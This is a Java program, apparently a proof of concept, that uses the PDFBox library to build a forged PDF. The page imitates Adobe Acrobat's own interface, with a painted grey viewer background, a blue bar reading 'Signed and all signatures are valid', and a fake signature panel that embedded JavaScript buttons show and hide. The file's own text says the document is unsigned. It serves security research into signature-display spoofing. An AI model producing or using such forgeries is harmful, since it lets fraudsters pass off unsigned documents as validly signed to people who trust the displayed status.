import java.awt.Color;
import java.io.File;

import org.apache.pdfbox.pdmodel.PDDocument;
import org.apache.pdfbox.pdmodel.PDPage;
import org.apache.pdfbox.pdmodel.PDPageContentStream;
import org.apache.pdfbox.pdmodel.PDPageContentStream.AppendMode;
import org.apache.pdfbox.pdmodel.common.PDRectangle;
import org.apache.pdfbox.pdmodel.font.PDType1Font;
import org.apache.pdfbox.pdmodel.graphics.image.PDImageXObject;
import org.apache.pdfbox.pdmodel.graphics.optionalcontent.PDOptionalContentGroup;
import org.apache.pdfbox.pdmodel.graphics.optionalcontent.PDOptionalContentProperties;
import org.apache.pdfbox.pdmodel.graphics.optionalcontent.PDOptionalContentProperties.BaseState;
import org.apache.pdfbox.pdmodel.interactive.action.PDActionJavaScript;
import org.apache.pdfbox.pdmodel.interactive.annotation.PDAnnotationWidget;
import org.apache.pdfbox.pdmodel.interactive.form.PDAcroForm;
import org.apache.pdfbox.pdmodel.interactive.form.PDPushButton;

public class createMaliciousPDF {

   final static float[] pageDims={2000.0f, 1150.0f};
   final static float signatureBarHeight=40.0f;

   public static void CreateBasePDF(String path) throws Exception{
      PDDocument document= new PDDocument();
      PDPage page= new PDPage(new PDRectangle(pageDims[0],pageDims[1]));
      document.addPage(page);
      PDPageContentStream cStream = new PDPageContentStream(document, page);

      //Fake grey background of Acrobat
      cStream.setNonStrokingColor(153/255.0f, 153/255.0f, 153/255.0f);;
      cStream.addRect(0, 0, pageDims[0], pageDims[1]);
      cStream.fill();

      //Add the "PDF" by adding a white rectangle in A4 dimensions
      cStream.setNonStrokingColor(Color.WHITE);
      cStream.addRect((pageDims[0]-PDRectangle.A4.getWidth())/2, (pageDims[1]-PDRectangle.A4.getHeight())/2, PDRectangle.A4.getWidth(), PDRectangle.A4.getHeight());
      cStream.fill();

      //Add text of the fake A4-PDF
      cStream.beginText();
      float a4fontSize=24;
      cStream.setFont(PDType1Font.COURIER, a4fontSize);
      cStream.setNonStrokingColor(Color.BLACK);
      cStream.newLineAtOffset((pageDims[0]-PDRectangle.A4.getWidth())/2+15,(pageDims[1]+PDRectangle.A4.getHeight())/2-a4fontSize-30);
      cStream.showText("This document is not signed and pretends");
      cStream.newLineAtOffset(0,-1.50f*a4fontSize);
      cStream.showText("to have a valid signature.");
      cStream.endText();

      //Finish PDF creation
      cStream.close();
      document.save(path);
      document.close();
   }

   public static void AddSignatureBar(String path) throws Exception{
      //Open the page and prepare the ContentStream
      PDDocument document = PDDocument.load(new File(path));
      PDPage page = document.getPage(0);
      PDPageContentStream cStream = new PDPageContentStream(document, page, AppendMode.APPEND, true, true);

      //Add the blue signature bar
      cStream.setNonStrokingColor(199/255.0f, 227/255.0f, 248/255.0f);
      cStream.addRect(0, pageDims[1]-signatureBarHeight, pageDims[0], signatureBarHeight);
      cStream.fill();

      //Add the "valid signature" icon
      PDImageXObject signatureValidIcon = PDImageXObject.createFromFile("assets\\signature_valid.png", document);
      cStream.drawImage(signatureValidIcon, 0, pageDims[1]-signatureBarHeight);

      //Add text "Signed and all signatures are valid"
      cStream.beginText();
      float sigFontSize=16.0f;
      cStream.setFont(PDType1Font.HELVETICA, sigFontSize);
      cStream.setNonStrokingColor(Color.BLACK);
      cStream.newLineAtOffset((signatureValidIcon.getWidth()+5.0f),(pageDims[1]-(signatureBarHeight+sigFontSize)/2));
      cStream.showText("Signed and all signatures are valid");
      cStream.endText();

      //Add Signature Panel "button"
      PDImageXObject signaturePanel = PDImageXObject.createFromFile("assets\\view_signatures.png", document);
      cStream.drawImage(signaturePanel,pageDims[0]-signaturePanel.getWidth(), pageDims[1]-signatureBarHeight);

      //Save the changes and close the ContentStream
      cStream.close();
      document.save(path);
      document.close();
   }

   public static void AddSignaturePanel (String path) throws Exception {
      //Open the page and prepare the contentStream
      PDDocument document = PDDocument.load(new File(path));
      PDPage page = document.getPage(0);
      PDPageContentStream cStream = new PDPageContentStream(document, page, AppendMode.APPEND, true, true);

      //Add the fake signaturePanel as an image to the document
      PDImageXObject signaturePanel = PDImageXObject.createFromFile("assets\\signature_panel.png", document);
      cStream.drawImage(signaturePanel, 0, pageDims[1]-signatureBarHeight-signaturePanel.getHeight());

      //Add the signaturePanel to an OptionalContenGroup (like a layer)
      PDOptionalContentGroup ocgroup = new PDOptionalContentGroup("sigpanel");
      signaturePanel.setOptionalContent(ocgroup);
      //Set all OptionalContentGroups to hidden and save the changes
      PDOptionalContentProperties ocprop = new PDOptionalContentProperties();
      ocprop.setBaseState(BaseState.OFF);
      ocprop.addGroup(ocgroup);
      document.getDocumentCatalog().setOCProperties(ocprop);
      cStream.close();
      document.save(path);
      document.close();
   }

   public static void AddInteraction(String path) throws Exception{
      //Load document
      PDDocument document= PDDocument.load(new File(path));
      PDPage page=document.getPage(0);
      PDAcroForm acroForm = new PDAcroForm(document);
      document.getDocumentCatalog().setAcroForm(acroForm);

      //Create open and close buttons and assign it to a widget
      PDPushButton openSignaturePanel = new PDPushButton(acroForm);
      PDPushButton closeSignaturePanel = new PDPushButton(acroForm);
      openSignaturePanel.setPartialName("openSignaturePanel");
      closeSignaturePanel.setPartialName("closeSignaturePanel");
      PDAnnotationWidget widgetOpen = openSignaturePanel.getWidgets().get(0);
      PDAnnotationWidget widgetClose = closeSignaturePanel.getWidgets().get(0);

      //Place Widgets
      widgetOpen.setRectangle(new PDRectangle(pageDims[0]-157, pageDims[1]-signatureBarHeight, 157, signatureBarHeight));
      widgetClose.setRectangle(new PDRectangle(230,pageDims[1]-signatureBarHeight-35,30,30));
      widgetOpen.setPage(page);
      widgetClose.setPage(page);

      //Configure Widgets to enable/disable the Optional Content Group of the signature panel
      PDActionJavaScript jsOpenSP = new PDActionJavaScript("this.getOCGs()[0].state=true;");
      PDActionJavaScript jsCloseSP = new PDActionJavaScript("this.getOCGs()[0].state=false;");
      widgetOpen.setAction(jsOpenSP);
      widgetClose.setAction(jsCloseSP);

      //Add widgets to document
      acroForm.getFields().add(openSignaturePanel);
      acroForm.getFields().add(closeSignaturePanel);
      page.getAnnotations().add(widgetOpen);
      page.getAnnotations().add(widgetClose);
      document.save(path);
      document.close();
   }

   public static void main(String args[]) throws Exception{
      var path="pdfWithFakeSignature.pdf";
      CreateBasePDF(path);
      AddSignatureBar(path);
      AddSignaturePanel(path);
      AddInteraction(path);
      System.out.println("Created PDF");
   }
}